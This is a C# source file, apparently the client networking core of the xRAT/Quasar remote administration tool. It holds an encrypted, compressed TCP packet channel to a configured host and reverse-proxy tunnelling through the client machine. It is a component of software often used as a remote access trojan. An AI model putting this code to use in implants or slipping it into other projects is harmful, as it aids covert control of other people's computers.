﻿using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using ProtoBuf;
using ProtoBuf.Meta;
using xClient.Config;
using xClient.Core.Compression;
using xClient.Core.Encryption;
using xClient.Core.Extensions;
using xClient.Core.Packets;
using xClient.Core.ReverseProxy.Packets;
using System.Collections.Generic;
using xClient.Core.ReverseProxy;
using System.Windows.Forms;

namespace xClient.Core
{
    public class Client
    {
        public event ClientFailEventHandler ClientFail;

        public delegate void ClientFailEventHandler(Client s, Exception ex);

        private void OnClientFail(Exception ex)
        {
            if (ClientFail != null)
            {
                ClientFail(this, ex);
            }
        }

        public event ClientStateEventHandler ClientState;

        public delegate void ClientStateEventHandler(Client s, bool connected);

        private void OnClientState(bool connected)
        {
            if (Connected == connected) return;

            Connected = connected;
            if (ClientState != null)
            {
                ClientState(this, connected);
            }
        }

        public event ClientReadEventHandler ClientRead;

        public delegate void ClientReadEventHandler(Client s, IPacket packet);

        private void OnClientRead(IPacket packet)
        {
            if (ClientRead != null)
            {
                ClientRead(this, packet);
            }
        }

        public event ClientWriteEventHandler ClientWrite;

        public delegate void ClientWriteEventHandler(Client s, IPacket packet, long length, byte[] rawData);

        private void OnClientWrite(IPacket packet, long length, byte[] rawData)
        {
            if (ClientWrite != null)
            {
                ClientWrite(this, packet, length, rawData);
            }
        }

        public enum ReceiveType
        {
            Header,
            Payload
        }

        private List<ReverseProxyClient> _proxyClients;

        public ReverseProxyClient[] ProxyClients
        {
            get { return _proxyClients.ToArray(); }
        }

        public const uint KEEP_ALIVE_TIME = 25000;
        public const uint KEEP_ALIVE_INTERVAL = 25000;

        public const int HEADER_SIZE = 4;
        public const int MAX_PACKET_SIZE = (1024*1024)*2; //2MB
        private Socket _handle;
        private int _typeIndex;

        private byte[] _buffer = new byte[MAX_PACKET_SIZE];

        //receive info
        private int _readOffset;
        private int _writeOffset;
        private int _readableDataLen;
        private int _payloadLen;
        private ReceiveType _receiveState = ReceiveType.Header;

        //Connection info
        public bool Connected { get; private set; }

        private const bool encryptionEnabled = true;
        private const bool compressionEnabled = true;

        public Client()
        {
        }

        public void Connect(string host, ushort port)
        {
            try
            {
                Disconnect();
                Initialize();

                _handle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                SocketExtensions.SetKeepAliveEx(_handle, KEEP_ALIVE_INTERVAL, KEEP_ALIVE_TIME);
                _handle.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.NoDelay, true);
                _handle.NoDelay = true;

                _handle.Connect(host, port);

                if (_handle.Connected)
                {
                    _handle.BeginReceive(this._buffer, 0, this._buffer.Length, SocketFlags.None, AsyncReceive, null);
                    OnClientState(true);
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show("ERROR:  " + ex.ToString());
                OnClientFail(ex);
                Disconnect();
            }
        }

        private void Initialize()
        {
            AddTypeToSerializer(typeof (IPacket), typeof (UnknownPacket));
            _proxyClients = new List<ReverseProxyClient>();
        }

        private void AsyncReceive(IAsyncResult result)
        {
            int bytesTransferred = -1;
            try
            {
                bytesTransferred = _handle.EndReceive(result);

                if (bytesTransferred <= 0)
                {
                    OnClientState(false);
                    return;
                }
            }
            catch (Exception)
            {
                OnClientState(false);
                return;
            }

            _readableDataLen += bytesTransferred;
            bool process = true;

            while (process)
            {
                switch (_receiveState)
                {
                    case ReceiveType.Header:
                    {
                        process = _readableDataLen >= HEADER_SIZE;
                        if (process)
                        {
                            _payloadLen = BitConverter.ToInt32(_buffer, _readOffset);

                            _readableDataLen -= HEADER_SIZE;
                            _readOffset += HEADER_SIZE;
                            _receiveState = ReceiveType.Payload;
                        }
                        break;
                    }
                    case ReceiveType.Payload:
                    {
                        process = _readableDataLen >= _payloadLen;
                        if (process)
                        {
                            byte[] payload = new byte[_payloadLen];
                            try
                            {
                                Array.Copy(this._buffer, _readOffset, payload, 0, payload.Length);
                            }
                            catch
                            {
                            }

                            if (encryptionEnabled)
                                payload = AES.Decrypt(payload, Encoding.UTF8.GetBytes(Settings.PASSWORD));

                            if (payload.Length > 0)
                            {
                                if (compressionEnabled)
                                    payload = new SafeQuickLZ().Decompress(payload, 0, payload.Length);

                                using (MemoryStream deserialized = new MemoryStream(payload))
                                {
                                    IPacket packet = Serializer.DeserializeWithLengthPrefix<IPacket>(deserialized,
                                        PrefixStyle.Fixed32);

                                    OnClientRead(packet);
                                }
                            }

                            _readOffset += _payloadLen;
                            _readableDataLen -= _payloadLen;
                            _receiveState = ReceiveType.Header;
                        }
                        break;
                    }
                }
            }

            int len = _receiveState == ReceiveType.Header ? HEADER_SIZE : _payloadLen;
            if (_readOffset + len >= this._buffer.Length)
            {
                //copy the buffer to the beginning
                Array.Copy(this._buffer, _readOffset, this._buffer, 0, _readableDataLen);
                _writeOffset = _readableDataLen;
                _readOffset = 0;
            }
            else
            {
                //payload fits in the buffer from the current offset
                //use BytesTransferred to write at the end of the payload
                //so that the data is not split
                _writeOffset += bytesTransferred;
            }

            try
            {
                if (_buffer.Length - _writeOffset > 0)
                {
                    _handle.BeginReceive(this._buffer, _writeOffset, _buffer.Length - _writeOffset, SocketFlags.None,
                        AsyncReceive, null);
                }
                else
                {
                    //Shoudln't be even possible... very strange
                    Disconnect();
                }
            }
            catch
            {
                Disconnect();
            }
        }

        public void Send<T>(T packet) where T : IPacket
        {
            lock (_handle)
            {
                if (!Connected)
                    return;

                try
                {
                    using (MemoryStream ms = new MemoryStream())
                    {
                        Serializer.SerializeWithLengthPrefix<T>(ms, packet, PrefixStyle.Fixed32);

                        byte[] data = ms.ToArray();

                        Send(data);
                        OnClientWrite(packet, data.LongLength, data);
                    }
                }
                catch
                {
                }
            }
        }

        private void Send(byte[] data)
        {
            if (!Connected)
                return;

            if (compressionEnabled)
                data = new SafeQuickLZ().Compress(data, 0, data.Length, 3);

            if (encryptionEnabled)
                data = AES.Encrypt(data, Encoding.UTF8.GetBytes(Settings.PASSWORD));

            byte[] temp = BitConverter.GetBytes(data.Length);

            byte[] payload = new byte[data.Length + 4];
            Array.Copy(temp, payload, temp.Length);
            Array.Copy(data, 0, payload, 4, data.Length);

            try
            {
                _handle.Send(payload);
            }
            catch
            {
                Disconnect();
            }
        }

        public void Disconnect()
        {
            try
            {
                OnClientState(false);

                if (_handle != null)
                {
                    _handle.Close();
                    _readOffset = 0;
                    _writeOffset = 0;
                    _readableDataLen = 0;
                    _payloadLen = 0;

                    if (_proxyClients != null)
                    {
                        lock (_proxyClients)
                        {
                            foreach (ReverseProxyClient proxy in _proxyClients)
                                proxy.Disconnect();
                        }
                    }
                    Commands.CommandHandler.StreamCodec = null;
                }
            }
            catch (Exception)
            {
                // welp thats a problem
            }
        }

        /// <summary>
        /// Adds a Type to the serializer so a message can be properly serialized.
        /// </summary>
        /// <param name="parent">The parent type, i.e.: IPacket</param>
        /// <param name="type">Type to be added</param>
        public void AddTypeToSerializer(Type parent, Type type)
        {
            if (type == null || parent == null)
                throw new ArgumentNullException();

            bool isAdded = false;
            foreach (SubType subType in RuntimeTypeModel.Default[parent].GetSubtypes())
                if (subType.DerivedType.Type == type)
                    isAdded = true;

            if (!isAdded)
                RuntimeTypeModel.Default[parent].AddSubType(_typeIndex += 1, type);
        }

        public void AddTypesToSerializer(Type parent, params Type[] types)
        {
            foreach (Type type in types)
                AddTypeToSerializer(parent, type);
        }

        public void ConnectReverseProxy(ReverseProxyConnect Command)
        {
            lock (_proxyClients)
            {
                _proxyClients.Add(new ReverseProxyClient(Command, this));
            }
        }

        public ReverseProxyClient GetReverseProxyByConnectionId(int ConnectionId)
        {
            lock (_proxyClients)
            {
                for (int i = 0; i < _proxyClients.Count; i++)
                {
                    if (_proxyClients[i].ConnectionId == ConnectionId)
                        return _proxyClients[i];
                }
                return null;
            }
        }

        public void RemoveProxyClient(int ConnectionId)
        {
            try
            {
                lock (_proxyClients)
                {
                    for (int i = 0; i < _proxyClients.Count; i++)
                    {
                        if (_proxyClients[i].ConnectionId == ConnectionId)
                        {
                            _proxyClients.RemoveAt(i);
                            break;
                        }
                    }
                }
            }
            catch { }
        }
    }
}